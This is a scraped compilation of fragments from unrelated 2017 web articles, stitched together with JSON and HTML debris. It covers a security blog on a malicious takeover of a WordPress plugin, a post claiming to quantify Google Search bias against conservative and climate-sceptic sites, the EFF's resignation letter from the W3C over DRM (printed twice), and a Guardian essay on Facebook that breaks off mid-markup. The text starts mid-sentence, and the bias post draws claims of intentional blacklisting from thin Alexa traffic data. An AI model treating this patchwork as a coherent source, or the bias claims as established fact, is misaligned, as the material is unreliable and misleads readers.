provide who ever you contact, with that email address.On the website for that domain they claim to have 34 plugins with 10 million+ installs:There is nothing on that website that backs up those claims. If you click the button “34 Plugins &amp; Counting” it takes you the only other page on the website:The text on that page doesn’t exactly make them sound legitimate:Is your plugin outdated? Can you not be bothered to respond to the support forum?Here at wpdevs we would like to offer you money to take away this burden!That domain name was registered on April 7 of this year and a privacy service is used, so no details are listed for the registrant.We Are Already WarningIf you were using our service you would have already been warned by now if you were using one of the versions of the plugin that contained the malicious code.We have also updated the free data that comes with the companion plugin to our service, so that those not using the service are getting warned as well as they update to the new version of our plugin. In what seems like a good example of the poor state of security surrounding WordPress, our plugin is used on a fraction of the websites as other security plugin that don’t really provide any protection.We are looking to see if there is anything in the code that added to this plugin that might be something that would be useful to watch for as part of the proactive monitoring of vulnerabilities in plugins that we do, which already incorporates checking based on previous instances of intentionally (or possible intentional) malicious code being included in plugins.Offering to Take Over the PluginOver at our main website we recently started offering a service to takeover abandoned plugins, which involves us doing a security review of the plugin, fixing any bugs, and making sure that it is compatible with new versions of WordPress. After we put that together we had the thought that in the future if plugins with vulnerabilities that are being exploited don’t get fixed we would try to take over the plugin to make sure that the damage done by WordPress’ poor handling of the situation is limited.Hopefully the folks on the WordPress side of things will quickly release a new version of the plugin, which removes the malicious code in it. That could easily been done by simply releasing the version from the before the plugin was taken over with a new version number. If they don’t do that in the next week we will offer to take over the plugin to make sure people are provided with a secured version.Clearnet: https://www.pluginvulnerabilities.com/2017/09/11/wordpress-poor-handling-of-plugin-security-exacerbates-malicious-takeover-of-display-widgets/",

See Robert Epstein et al, A Method for Detecting Bias in Search Rankings, with Evidence of Systematic Bias Related to the 2016 Presidential Election;  Todd Dunning’s 2015-09-15 comment; Leo Goldstein, Why are Search Engines so Hostile to Climate Realism?These observations have not completely resolved the question whether the bias was intentional, or reflected the biased web content.  Recently, Google’s official Search Evaluation Guidelines have shown intentional bias against climate realism. At least one former Google employee claimed intentional demotion of “anything non-PC” by the Google Search team.This paper uses published SEO data from multiple sources, including BrightEdge Research, 2017: Organic Search Is Still the Largest Channel, updating its 2014 report. From here on, the term ‘bias’ means intentional bias.  This paper formulates, substantiates, and applies a quantitative method of bias detection in Google Search.MethodsIt is known that Google Search provides 25%-30% of the user’s traffic to an average website.  As Google executives and PR repeated many times, Google Search service exists to provide the most relevant and useful results to the user’s queries.  Google Chairman Eric Schmidt even joked that there should be only one result for each query – the result that the user seeks.  Google servers crawl the whole web, extracting text, links, and other data from trillions of pages.  Google constantly and successfully fights attempts to artificially promote websites through collusive linking, and other search engine optimization techniques.  In its undertaking, Google also uses an enormous amount of off-web information, which it collects through Chrome browser, other Google applications and services, analytics beacons, domains registrar status, and so on.  This information includes domains popularity and ownership.  Google also processes immediate feedback from the users in the form of frequency of clicks on the results, bounce rate, the frequency of repeated searches with modified terms, etc.Google is very good at its job.  Sites and domains that are less popular with the visitors tend to be less likely to receive traffic from Google, and vice versa.  The effect is that percentage of net traffic that domains receive from Google Search tends to be similar across web domains!  This fact is illustrated by nearly zero correlation between domain popularity and percentage of net traffic it receives from Google within each of the sets of the left/liberal media and conservative media, despite the domain popularity (according to Alexa.com, lower values mean higher popularity), varying from 24 to 1,469 for the left/liberal media set, and from 56 to 12,795 for the conservative media set.  Traffic from Google ads is about 5% of the total Google traffic, so it is not a factor.  “Net traffic,” used throughout this research, excludes traffic received from the users, intentionally searching for the website by its name (i.e., searches for ‘foxnews’ and ‘fox news’ are excluded from the net traffic for foxnews.com).  Net traffic better reflects Google intent, because Google Search does not have much choice when the user searches for a website by its name or brand.  Alexa.com provides information which allows PGSTN calculation for hundreds of thousands of web domains.Given the robustness of PGSTN, I conclude that statistically significant difference in PGSTN between a priori defined sets of comparable domains is due to intentional bias by Google, unless there is another good explanation.Methodological DetailsAll the data in this research is based on Alexa (free version) snapshots from September 4, 2017.  For each domain, Google Search Total was taken from “Upstream Sites | Which sites did people visit immediately before this site?” table. Branded traffic was taken from the “Top Keywords from Search Engines | Which search keywords send traffic to this site?” table.  It should be noted that only five top values, appearing in the free Alexa snapshots, were used.  All Google search domains shown in the table were included (google.com, google.ca, google.co.uk, google.co.in etc.) If the total of the branded traffic were less than 5%, the value 1% was entered.  PGSTN was calculated by deducting branded search traffic from the total Google Search traffic.PGSTN is not expected to provide sufficient certainty for individual domains, because multiple factors influence it, including possible error in Alexa data.  Nevertheless, the Google attitude toward a domain has been provisionally noted and color coded in the attached spreadsheet PGSTN-Domains.xlsx as follows:Whitelist / Green Light: &gt;36% Normal: 20%-36% Grey Area: 12%-20% Blacklist: &lt;=12% Most domains were expected (based on the cited SEO research) to have PGSTN in the 20%-36% range. This expectation has been met.  PGSTN &lt;= 12% provisionally indicates that the domain is blacklisted by Google.  Everything between the blacklist and the normal range is considered a grey area.  Finally, PGSTN &gt; 36% provisionally indicates unusual favoritism by Google.Google Bias in Climate DebateThe domains were selected mostly according to Alexa classification.  Detection of extreme bias Google Search has against climate realism did not require statistical methods.  There is a huge gap between PGSTN of realism domains (6.3% – 17.4%), and PGSTN of climate alarmism domains (23.5%-52.4%).  The gap is 6.1%.  Except for drroyspencer.com, all climate realism domains are blacklisted by Google (PGSTN is 6.3% – 11.0%).On the other hand, self-appointed “fact checkers,” including snopes.com and politifact.com have PGSTN about 50%.  That gives ground to the suspicion that they had been hand-picked by Google for prioritization.  Another two sites with suspiciously high PGSTN are sourcewatch.org (PGSTN = 50.1%) and prwatch.org (PGSTN = 40.9%).  These two sites grossly exchange links (they refer to each other as the source), have overlapping content, and are known to Google to belong to the same organization, the Center for Media and Democracy.  These are well-known signs of spam – yet Google has not only failed to downrank them as spam, but likely manually prioritized them.This section includes netrootsnation.org, a site of a radical left conference, not specifically geared toward climate alarmism.  Its PGSTN = 44.5%.  This domain could have been hand-picked or its owners had been advised by Google insiders on gaming the rankings.  Google has funded the conference, and Google representatives attended it and made presentations on relevant subjects, like this one. A quote:“We’ll share some ways to leverage the power of online video and how to integrate Google and YouTube’s tools with other advocacy efforts.”All other alarmist domains have PGSTN in the whitelisted or normal range.Google Bias in General Political DiscourseTo quantify Google general political bias, I selected top U.S. news and opinions sites by their ranking in Alexa, then added some lower ranking conservative sites based on my personal knowledge and/or Alexa suggestions.  There was an element of subjectivity in selection and classification, and I omitted some domains that I could not classify.  Nevertheless, the most popular domains in both left/liberal (including Left, Mainstream Liberal, and Mainstream Center) and conservative (including Conservative and Mainstream Conservative) categories have been selected and classified rigorously, and use of weighted statistics minimized the element of subjectivity in the results.  The results show that Google Search is heavily biased against conservative domains, and some respectable conservative domains seem to be blacklisted:thegatewaypundit.compjmedia.comamericanthinker.comredstate.compowerlineblog.comdrudgereport.comThere might be an alternative or additional explanation for low PGSTN of the Drudge Report – the site mostly consists of links to articles on other sites, a practice Google looks down on.On average, the conservative domains have almost two times lower PGSTN than the left/liberal ones: conservative 15.5% (standard deviation 5.1%) vs. left/liberal 27.4% (standard deviation 4.9%).  Hypothesis of Google Search left/liberal bias is confirmed with a confidence of 95%.DiscussionAlthough PGSTN of individual domains is not sufficient for conclusions, I cannot avoid noticing that extremist websites, such as dailystormer.com (PGSTN = 13.6%; ceased to exist by the time of the research) and dailykos.com (PGSTN = 20.2%) are preferred by Google over many conservative and climate realist domains.ConclusionsGoogle Search is biased in favor of left/liberal websites against conservative websites, and is extremely biased in favor of climate alarmism against climate realism. DisclosureI hold short positions in Google stock.ReferencesThe references are in the body of the article.Supplementary MaterialsAlexa snapshots are available from https://defyccc.com/data/PGSTN-Snapshots.7z (compressed with 7-Zip). Contact Author: Leo Goldstein, DefyCCC.com, ah@defyccc.comClearnet: https://wattsupwiththat.com/2017/09/08/a-method-of-google-search-bias-quantification-and-its-application-in-climate-debate-and-general-political-discourse/",

In their public <br/>statements about the standard, the W3C executive repeatedly said that <br/>they didn't think the DRM advocates would be willing to compromise, and <br/>in the absence of such willingness, the exec have given them everything <br/>they demanded.<br/></p><p><br/>This is a bad day for the W3C:  it's the day it publishes a standard <br/>designed to control, rather than empower, web users. That standard that <br/>was explicitly published without any protections -- even <a href=\"https://lists.w3.org/Archives/Public/public-html-media/2017Jun/0017.html\">the most minimal compromise was rejected without discussion</a>, an intransigence  that the <a href=\"https://lists.w3.org/Archives/Public/public-html-media/2017Jun/0019.html\">W3C leadership tacitly approved</a>.<br/> It's the day that the W3C changed its process to reward stonewalling <br/>over compromise, provided those doing the stonewalling are the biggest <br/>corporations in the consortium.<br/></p><p><br/>EFF no longer believes that the W3C process is suited to defending the <br/>open web. We have resigned from the Consortium, effective today. Below <br/>is our resignation letter:<br/><br/></p><p><br/></p><hr/><br/><p><br/></p><p>Dear Jeff, Tim, and colleagues,</p><br/><p>In 2013, EFF was disappointed to learn that the W3C had taken on the <br/>project of standardizing “Encrypted Media Extensions,” an API whose sole<br/> function was to provide a first-class role for DRM within the Web <br/>browser ecosystem. By doing so, the organization offered the use of its <br/>patent pool, its staff support, and its moral authority to the idea that<br/> browsers can and should be designed to cede control over key aspects <br/>from users to remote parties.</p><br/><p>When it became clear, following <a href=\"https://www.eff.org/pages/drm/w3c-formal-objection-html-wg\">our formal objection</a>,<br/> that the W3C's largest corporate members and leadership were wedded to <br/>this project despite strong discontent from within the W3C membership <br/>and staff, their <a href=\"https://blog.whatwg.org/drm-and-web-security\">most important partners</a>, and <a href=\"https://www.fsf.org/blogs/rms/w3c-soul-at-stake\">other</a> <a href=\"https://opensource.org/osr-drm\">supporters</a><br/> of the open Web, we proposed a compromise. We agreed to stand down <br/>regarding the EME standard, provided that the W3C extend its existing <br/>IPR policies to deter members from using DRM laws in connection with the<br/> EME (such as Section 1201 of the US Digital Millennium Copyright Act or<br/> European national implementations of Article 6 of the EUCD) except in <br/>combination with another cause of action.</p><br/><p>This covenant would allow the W3C's large corporate members to <br/>enforce their copyrights. Indeed, it kept intact every legal right to <br/>which entertainment companies, DRM vendors, and their business partners <br/>can otherwise lay claim. The compromise merely restricted their ability <br/>to use the W3C's DRM to shut down legitimate activities, like research <br/>and modifications, that required circumvention of DRM. It would signal <br/>to the world that the W3C wanted to make a difference in how DRM was <br/>enforced: that it would use its authority to draw a line between the <br/>acceptability of DRM as an optional technology, as opposed to an excuse <br/>to undermine legitimate research and innovation.</p><br/><p>More directly, such a covenant would have helped protect the key <br/>stakeholders, present and future, who both depend on the openness of the<br/> Web, and who actively work to protect its safety and universality. It <br/>would offer some legal clarity for those who bypass DRM to engage in <br/>security research to find defects that would endanger billions of web <br/>users; or who automate the creation of enhanced, accessible video for <br/>people with disabilities; or who archive the Web for posterity. It would<br/> help protect new market entrants intent on creating competitive, <br/>innovative products, unimagined by the vendors locking down web video.</p><br/><p>Despite the support of W3C members from many sectors, the leadership <br/>of the W3C rejected this compromise. The W3C leadership countered with <br/>proposals — like the chartering of a nonbinding discussion group on the <br/>policy questions that was not scheduled to report in until long after <br/>the EME ship had sailed — that would have still left researchers, <br/>governments, archives, security experts unprotected.</p><br/><p>The W3C is a body that ostensibly operates on consensus. <br/>Nevertheless, as the coalition in support of a DRM compromise grew and <br/>grew — and the large corporate members continued to reject any <br/>meaningful compromise — the W3C leadership persisted in treating EME as <br/>topic that could be decided by one side of the debate.  In essence, a <br/>core of EME proponents was able to impose its will on the Consortium, <br/>over the wishes of a sizeable group of objectors — and every person who <br/>uses the web. The Director decided to personally override every single <br/>objection raised by the members, articulating several benefits that EME <br/>offered over the DRM that HTML5 had made impossible.</p><br/><p>But those very benefits (such as improvements to accessibility and <br/>privacy) depend on the public being able to exercise rights they lose <br/>under DRM law — which meant that without the compromise the Director was<br/> overriding, none of those benefits could be realized, either.

			"body_p": "World Wide Web Consortium abandons consensus, standardizes DRM with 58.4% support, EFF resigns            In July, the Director of the World Wide Web Consortium overruled dozens of members' objections to publishing a DRM standard without a compromise to protect accessibility, security research, archiving, and competition.EFF appealed the decision, the first-ever appeal in W3C history, which concluded last week with a deeply divided membership. 58.4% of the group voted to go on with publication, and the W3C did so today, an unprecedented move in a body that has always operated on consensus and compromise. In their public statements about the standard, the W3C executive repeatedly said that they didn't think the DRM advocates would be willing to compromise, and in the absence of such willingness, the exec have given them everything they demanded.This is a bad day for the W3C:  it's the day it publishes a standard designed to control, rather than empower, web users. That standard that was explicitly published without any protections -- even the most minimal compromise was rejected without discussion, an intransigence  that the W3C leadership tacitly approved. It's the day that the W3C changed its process to reward stonewalling over compromise, provided those doing the stonewalling are the biggest corporations in the consortium.EFF no longer believes that the W3C process is suited to defending the open web. We have resigned from the Consortium, effective today. Below is our resignation letter:Dear Jeff, Tim, and colleagues,In 2013, EFF was disappointed to learn that the W3C had taken on the project of standardizing “Encrypted Media Extensions,” an API whose sole function was to provide a first-class role for DRM within the Web browser ecosystem. By doing so, the organization offered the use of its patent pool, its staff support, and its moral authority to the idea that browsers can and should be designed to cede control over key aspects from users to remote parties.When it became clear, following our formal objection, that the W3C's largest corporate members and leadership were wedded to this project despite strong discontent from within the W3C membership and staff, their most important partners, and other supporters of the open Web, we proposed a compromise. We agreed to stand down regarding the EME standard, provided that the W3C extend its existing IPR policies to deter members from using DRM laws in connection with the EME (such as Section 1201 of the US Digital Millennium Copyright Act or European national implementations of Article 6 of the EUCD) except in combination with another cause of action.This covenant would allow the W3C's large corporate members to enforce their copyrights. Indeed, it kept intact every legal right to which entertainment companies, DRM vendors, and their business partners can otherwise lay claim. The compromise merely restricted their ability to use the W3C's DRM to shut down legitimate activities, like research and modifications, that required circumvention of DRM. It would signal to the world that the W3C wanted to make a difference in how DRM was enforced: that it would use its authority to draw a line between the acceptability of DRM as an optional technology, as opposed to an excuse to undermine legitimate research and innovation.More directly, such a covenant would have helped protect the key stakeholders, present and future, who both depend on the openness of the Web, and who actively work to protect its safety and universality. It would offer some legal clarity for those who bypass DRM to engage in security research to find defects that would endanger billions of web users; or who automate the creation of enhanced, accessible video for people with disabilities; or who archive the Web for posterity. It would help protect new market entrants intent on creating competitive, innovative products, unimagined by the vendors locking down web video.Despite the support of W3C members from many sectors, the leadership of the W3C rejected this compromise. The W3C leadership countered with proposals — like the chartering of a nonbinding discussion group on the policy questions that was not scheduled to report in until long after the EME ship had sailed — that would have still left researchers, governments, archives, security experts unprotected.The W3C is a body that ostensibly operates on consensus. Nevertheless, as the coalition in support of a DRM compromise grew and grew — and the large corporate members continued to reject any meaningful compromise — the W3C leadership persisted in treating EME as topic that could be decided by one side of the debate.  In essence, a core of EME proponents was able to impose its will on the Consortium, over the wishes of a sizeable group of objectors — and every person who uses the web. The Director decided to personally override every single objection raised by the members, articulating several benefits that EME offered over the DRM that HTML5 had made impossible.But those very benefits (such as improvements to accessibility and privacy) depend on the public being able to exercise rights they lose under DRM law — which meant that without the compromise the Director was overriding, none of those benefits could be realized, either. That rejection prompted the first appeal against the Director in W3C history.In our campaigning on this issue, we have spoken to many, many members' representatives who privately confided their belief that the EME was a terrible idea (generally they used stronger language) and their sincere desire that their employer wasn't on the wrong side of this issue. This is unsurprising. You have to search long and hard to find an independent technologist who believes that DRM is possible, let alone a good idea. Yet, somewhere along the way, the business values of those outside the web got important enough, and the values of technologists who built it got disposable enough, that even the wise elders who make our standards voted for something they know to be a fool's errand.We believe they will regret that choice. Today, the W3C bequeaths an legally unauditable attack-surface to browsers used by billions of people. They give media companies the power to sue or intimidate away those who might re-purpose video for people with disabilities. They side against the archivists who are scrambling to preserve the public record of our era. The W3C process has been abused by companies that made their fortunes by upsetting the established order, and now, thanks to EME, they’ll be able to ensure no one ever subjects them to the same innovative pressures.So we'll keep fighting to fight to keep the web free and open. We'll keep suing the US government to overturn the laws that make DRM so toxic, and we'll keep bringing that fight to the world's legislatures that are being misled by the US Trade Representative to instigate local equivalents to America's legal mistakes.We will renew our work to battle the media companies that fail to adapt videos for accessibility purposes, even though the W3C squandered the perfect moment to exact a promise to protect those who are doing that work for them.We will defend those who are put in harm's way for blowing the whistle on defects in EME implementations.It is a tragedy that we will be doing that without our friends at the W3C, and with the world believing that the pioneers and creators of the web no longer care about these matters.Effective today, EFF is resigning from the W3C.Thank you,Cory DoctorowAdvisory Committee Representative to the W3C for the Electronic Frontier FoundationClearnet: https://boingboing.net/2017/09/18/antifeatures-for-all.html",

It’s a phoniness that is most obvious in the compressed, <br/>historic career of Facebook’s mastermind.</p><p><br/></p><p>Mark Zuckerberg is a good boy, but he wanted to be bad, or maybe just<br/> a little bit naughty. The heroes of his adolescence were the original <br/>hackers. These weren’t malevolent data thieves or cyberterrorists. <br/>Zuckerberg’s hacker heroes were disrespectful of authority. They were <br/>technically virtuosic, infinitely resourceful nerd cowboys, unbound by <br/>conventional thinking. In the labs of the Massachusetts Institute of <br/>Technology (MIT) during the 60s and 70s, they broke any rule that <br/>interfered with building the stuff of early computing, such marvels as <br/>the first video games and word processors. With their free time, they <br/>played <a href=\"https://www.boston.com/uncategorized/noprimarytagmatch/2012/09/17/hackers-delight-a-history-of-mit-pranks-and-hacks\" class=\"u-underline in-body-link--immersive\">epic pranks</a>,<br/> which happened to draw further attention to their own cleverness – <br/>installing a living cow on the roof of a Cambridge dorm; launching a <br/>weather balloon, which miraculously emerged from beneath the turf, <br/>emblazoned with “MIT”, <a href=\"https://www.youtube.com/watch?v=MLg2XpY0L3w\" class=\"u-underline in-body-link--immersive\">in the middle of a Harvard-Yale football game</a>.</p><p><br/></p><p>The hackers’ archenemies were the bureaucrats who ran universities, <br/>corporations and governments. Bureaucrats talked about making the world <br/>more efficient, just like the hackers. But they were really small-minded<br/> paper-pushers who fiercely guarded the information they held, even when<br/> that information yearned to be shared. When hackers clearly engineered <br/>better ways of doing things – a box that enabled free long-distance <br/>calls, an instruction that might improve an operating system – the <br/>bureaucrats stood in their way, wagging an unbending finger. The hackers<br/> took aesthetic and comic pleasure in outwitting the men in suits.</p><p><br/></p><p>When Zuckerberg arrived at Harvard in the fall of 2002, the heyday of<br/> the hackers had long passed. They were older guys now, the stuff of <br/>good tales, some stuck in twilight struggles against The Man. But <br/>Zuckerberg wanted to hack, too, and with that old-time indifference to <br/>norms. In high school he picked the lock that prevented outsiders from <br/>fiddling with AOL’s code and added his own improvements to its instant <br/>messaging program. As a college sophomore he hatched a site called <a href=\"http://www.thecrimson.com/article/2003/11/19/facemash-creator-survives-ad-board-the/\" class=\"u-underline in-body-link--immersive\">Facemash</a><br/> – with the high-minded purpose of determining the hottest kid on <br/>campus. Zuckerberg asked users to compare images of two students and <br/>then determine the better-looking of the two. The winner of each pairing<br/> advanced to the next round of his hormonal tournament. To cobble this <br/>site together, Zuckerberg needed photos. He purloined those from the <br/>servers of the various Harvard houses. “One thing is certain,” he wrote <br/>on a blog as he put the finishing touches on his creation, “and it’s <br/>that I’m a jerk for making this site. Oh well.”</p><p><br/></p><p>His brief experimentation with rebellion ended with his apologising <br/>to a Harvard disciplinary panel, as well as to campus women’s groups, <br/>and mulling strategies to redeem his soiled reputation. In the years <br/>since, he has shown that defiance really wasn’t his natural inclination.<br/> His distrust of authority was such that he sought out <a href=\"https://www.forbes.com/sites/jeffbercovici/2012/02/02/facebook-and-don-graham-have-been-very-good-to-each-other/#68586c6728ba\" class=\"u-underline in-body-link--immersive\">Don Graham</a>,<br/> then the venerable chairman of the Washington Post company, as his <br/>mentor. After he started Facebook, he shadowed various giants of <br/>corporate America so that he could study their managerial styles up <br/>close.</p><p><br/></p><p>Still, Zuckerberg’s juvenile fascination with hackers never died – or<br/> rather, he carried it forward into his new, more mature incarnation. <br/>When he finally had a corporate campus of his own, he procured a vanity <br/>address for it: One Hacker Way. He designed a plaza with the word “HACK”<br/> inlaid into the concrete. In the centre of his office park, he created <br/>an open meeting space called Hacker Square. This is, of course, the <br/>venue where his employees join for all-night Hackathons. As he told a <br/>group of would-be entrepreneurs, “We’ve got this whole ethos that we <br/>want to build a hacker culture.”</p><p><br/></p><p>Plenty of companies have similarly appropriated hacker culture – <br/>hackers are the ur-disrupters – but none have gone as far as Facebook. <br/>By the time Zuckerberg began extolling the virtues of hacking, he had <br/>stripped the name of most of its original meaning and distilled it into a<br/> managerial philosophy that contains barely a hint of rebelliousness. <br/>Hackers, <a href=\"http://www.thewrap.com/mark-zuckerberg-means-hacker-video/\" class=\"u-underline in-body-link--immersive\">he told one interviewer</a>,<br/> were “just this group of computer scientists who were trying to quickly<br/> prototype and see what was possible. That’s what I try to encourage our<br/> engineers to do here.” To hack is to be a good worker, a responsible <br/>Facebook citizen – a microcosm of the way in which the company has taken<br/> the language of radical individualism and deployed it in the service of<br/> conformism.</p><p><br/></p><p>Zuckerberg claimed to have distilled that hacker spirit into a motivational motto: “<a href=\"https://www.theguardian.com/books/2017/apr/26/move-fast-and-break-things-jonathan-taplin-review-damage-silicon-valley\" class=\"u-underline in-body-link--immersive\">Move fast and break things</a>.”<br/> The truth is that Facebook moved faster than Zuckerberg could ever have<br/> imagined. His company was, as we all know, a dorm-room lark, a thing he<br/> ginned up in a Red Bull–induced fit of sleeplessness. As his creation <br/>grew, it needed to justify its new scale to its investors, to its users,<br/> to the world. It needed to grow up fast. Over the span of its short <br/>life, the company has caromed from self-description to self-description.<br/> It has called itself a tool, a utility and a platform. It has talked <br/>about openness and connectedness. And in all these attempts at defining <br/>itself, it has managed to clarify its intentions.<br/></p><figure class=\"element element-image img--landscape element--showcase  fig--narrow-caption fig--has-shares \" id=\"img-2\"><a href=\"https://www.theguardian.com/technology/2017/sep/19/facebooks-war-on-free-will#img-2\" class=\"article__img-container js-gallerythumbs in-body-link--immersive\"><img class=\"gu-image\" alt=\"Facebook Creators Mark Zuckerberg and Chris Hughes\" src=\"https://i.guim.co.uk/img/media/03de4283af1bb1c9ecb1cba7324f0c431c9de45b/223_313_1751_1051/master/1751.jpg?w=300&amp;q=55&amp;auto=format&amp;usm=12&amp;fit=max&amp;s=da51d73d1517c9d154af95b67e444f53\"/></a><figcaption class=\"caption caption--img caption caption--img\"><span class=\"inline-information inline-icon reveal-caption-icon centered-icon rounded-icon\"><svg width=\"6\" height=\"14\" class=\"reveal-caption-icon__svg centered-icon__svg rounded-icon__svg inline-information__svg inline-icon__svg\"><br/><path d=\"M4.6 12l-.4 1.4c-.7.2-1.9.6-3 .6-.7 0-1.2-.2-1.2-.9 0-.2 0-.3.1-.5l2-6.7H.7l.4-1.5 4.2-.6h.2L3 12h1.6zm-.3-9.2c-.9 0-1.4-.5-1.4-1.3C2.9.5 3.7 0 4.6 0 5.4 0 6 .5 6 1.3c0 1-.8 1.5-1.7 1.5z\"></path><br/></svg> </span> Facebook creators Mark Zuckerberg and Chris Hughes at Harvard in May 2004.

The theory holds <br/>that the sunshine of sharing our intimate details will disinfect the <br/>moral mess of our lives. With the looming threat that our embarrassing <br/>information will be broadcast, we’ll behave better. And perhaps the <br/>ubiquity of incriminating photos and damning revelations will prod us to<br/> become more tolerant of one another’s sins. “The days of you having a <br/>different image for your work friends or co-workers and for the other <br/>people you know are probably coming to an end pretty quickly,” <br/>Zuckerberg has said. “Having two identities for yourself is an example <br/>of a lack of integrity.”</p><p><br/></p><p>The point is that Facebook has a strong, paternalistic view on what’s<br/> best for you, and it’s trying to transport you there. “To get people to<br/> this point where there’s more openness – that’s a big challenge. But I <br/>think we’ll do it,” Zuckerberg has said. He has reason to believe that <br/>he will achieve that goal. With its size, Facebook has amassed outsized <br/>powers. “In a lot of ways Facebook is more like a government than a <br/>traditional company,” Zuckerberg has said. “We have this large community<br/> of people, and more than other technology companies we’re really <br/>setting policies.”</p><p><br/></p><hr class=\"section-rule\"/><p><br/></p><p><span class=\"drop-cap\"><span class=\"drop-cap__inner\">W</span></span>ithout<br/> knowing it, Zuckerberg is the heir to a long political tradition. Over <br/>the last 200 years, the west has been unable to shake an abiding <br/>fantasy, a dream sequence in which we throw out the bum politicians and <br/>replace them with engineers – rule by slide rule. The French were the <br/>first to entertain this notion in the bloody, world-churning aftermath <br/>of their revolution. A coterie of the country’s most influential <br/>philosophers (notably, Henri de Saint-Simon and <a href=\"https://www.theguardian.com/books/2015/jun/13/10-most-celebrated-french-thinkers-philosophy\" class=\"u-underline in-body-link--immersive\">Auguste Comte</a>)<br/> were genuinely torn about the course of the country. They hated all the<br/> old ancient bastions of parasitic power – the feudal lords, the priests<br/> and the warriors – but they also feared the chaos of the mob. To split <br/>the difference, they proposed a form of technocracy – engineers and <br/>assorted technicians would rule with beneficent disinterestedness. <br/>Engineers would strip the old order of its power, while governing in the<br/> spirit of science. They would impose rationality and order.</p><p><br/></p><p>This dream has captivated intellectuals ever since, especially Americans. The great sociologist <a href=\"https://www.theguardian.com/lifeandstyle/2009/aug/22/change-your-life-conspicuous-consumption\" class=\"u-underline in-body-link--immersive\">Thorstein Veblen</a><br/> was obsessed with installing engineers in power and, in 1921, wrote a <br/>book making his case. His vision briefly became a reality. In the <br/>aftermath of the first world war, American elites were aghast at all the<br/> irrational impulses unleashed by that conflict – the xenophobia, the <br/>racism, the urge to lynch and riot. And when the realities of economic <br/>life had grown so complicated, how could politicians possibly manage <br/>them? Americans of all persuasions began yearning for the salvific <br/>ascendance of the most famous engineer of his time: Herbert Hoover. In <br/>1920, Franklin D Roosevelt – who would, of course, go on to replace him <br/>in 1932 – organised a movement to draft Hoover for the presidency.</p><p><br/></p><p>The Hoover experiment, in the end, hardly realised the happy <br/>fantasies about the Engineer King. A very different version of this <br/>dream, however, has come to fruition, in the form of the CEOs of the big<br/> tech companies. We’re not ruled by engineers, not yet, but they have <br/>become the dominant force in American life – the highest, most <br/>influential tier of our elite.</p><p><br/></p><p>There’s another way to describe this historical progression. <br/>Automation has come in waves. During the industrial revolution, <br/>machinery replaced manual workers. At first, machines required human <br/>operators. Over time, machines came to function with hardly any human <br/>intervention. For centuries, engineers automated physical labour; our <br/>new engineering elite has automated thought. They have perfected <br/>technologies that take over intellectual processes, that render the <br/>brain redundant. Or, as the former Google and Yahoo executive <a href=\"https://www.theguardian.com/technology/marissa-mayer\" class=\"u-underline in-body-link--immersive\">Marissa Mayer</a><br/> once argued, “You have to make words less human and more a piece of the<br/> machine.” Indeed, we have begun to outsource our intellectual work to <br/>companies that suggest what we should learn, the topics we should <br/>consider, and the items we ought to buy. These companies can justify <br/>their incursions into our lives with the very arguments that Saint-Simon<br/> and Comte articulated: they are supplying us with efficiency; they are <br/>imposing order on human life.</p><p><br/></p><p>Nobody better articulates the modern faith in engineering’s power to <br/>transform society than Zuckerberg. He told a group of software <br/>developers, “You know, I’m an engineer, and I think a key part of the <br/>engineering mindset is this hope and this belief that you can take any <br/>system that’s out there and make it much, much better than it is today. <br/>Anything, whether it’s hardware or software, a company, a developer <br/>ecosystem – you can take anything and make it much, much better.” The <br/>world will improve, if only Zuckerberg’s reason can prevail – and it <br/>will.</p><p><br/></p><hr class=\"section-rule\"/><p><br/></p><p><span class=\"drop-cap\"><span class=\"drop-cap__inner\">T</span></span>he precise source of Facebook’s power is algorithms. That’s a concept <br/>repeated dutifully in nearly every story about the tech giants, yet it <br/>remains fuzzy at best to users of those sites. From the moment of the <br/>algorithm’s invention, it was possible to see its power, its <br/>revolutionary potential. The algorithm was developed in order to <br/>automate thinking, to remove difficult decisions from the hands of <br/>humans, to settle contentious debates.</p><p><br/></p><p>The essence of the algorithm is entirely uncomplicated. The textbooks<br/> compare them to recipes – a series of precise steps that can be <br/>followed mindlessly. This is different from equations, which have one <br/>correct result. Algorithms merely capture the process for solving a <br/>problem and say nothing about where those steps ultimately lead.</p><p><br/></p><p>These recipes are the crucial building blocks of software. <br/>Programmers can’t simply order a computer to, say, search the internet. <br/>They must give the computer a set of specific instructions for <br/>accomplishing that task. These instructions must take the messy human <br/>activity of looking for information and transpose that into an orderly <br/>process that can be expressed in code. First do this … then do that. The<br/> process of translation, from concept to procedure to code, is <br/>inherently reductive. Complex processes must be subdivided into a series<br/> of binary choices. There’s no equation to suggest a dress to wear, but <br/>an algorithm could easily be written for that – it will work its way <br/>through a series of either/or questions (morning or night, winter or <br/>summer, sun or rain), with each choice pushing to the next.</p><p><br/></p><p>For the first decades of computing, the term “algorithm” wasn’t much <br/>mentioned. But as computer science departments began sprouting across <br/>campuses in the 60s, the term acquired a new cachet. Its vogue was the <br/>product of status anxiety. Programmers, especially in the academy, were <br/>anxious to show that they weren’t mere technicians. They began to <br/>describe their work as algorithmic, in part because it tied them to one <br/>of the greatest of all mathematicians – the Persian polymath <a href=\"http://www-history.mcs.st-andrews.ac.uk/Biographies/Al-Khwarizmi.html\" class=\"u-underline in-body-link--immersive\">Muhammad ibn Musa al-Khwarizmi</a>,<br/> or as he was known in Latin, Algoritmi. During the 12th century, <br/>translations of al-Khwarizmi introduced Arabic numerals to the west; his<br/> treatises pioneered algebra and trigonometry. By describing the <br/>algorithm as the fundamental element of programming, the computer <br/>scientists were attaching themselves to a grand history. It was a savvy <br/>piece of name-dropping: See, we’re not arriviste, we’re working with <br/>abstractions and theories, just like the mathematicians!</p><figure class=\"element element-image img--landscape element--showcase  fig--narrow-caption fig--has-shares \" id=\"img-3\"><div class=\"u-responsive-ratio\"><br/><img class=\"gu-image\" alt=\"A statue of the mathematician Muhammad ibn Musa al-Khwarizmi in Uzbekistan.\" src=\"https://i.guim.co.uk/img/media/073416dbdeba1089848d359538e8aa98d689a267/0_60_5760_3456/master/5760.jpg?w=300&amp;q=55&amp;auto=format&amp;usm=12&amp;fit=max&amp;s=067d7e859849bf9d7c1a014cf196d3b8\"/><br/></div>  <figcaption class=\"caption caption--img caption caption--img\"><span class=\"inline-information inline-icon reveal-caption-icon centered-icon rounded-icon\"><svg width=\"6\" height=\"14\" class=\"reveal-caption-icon__svg centered-icon__svg rounded-icon__svg inline-information__svg inline-icon__svg\"><br/><path d=\"M4.6 12l-.4 1.4c-.7.2-1.9.6-3 .6-.7 0-1.2-.2-1.2-.9 0-.2 0-.3.1-.5l2-6.7H.7l.4-1.5 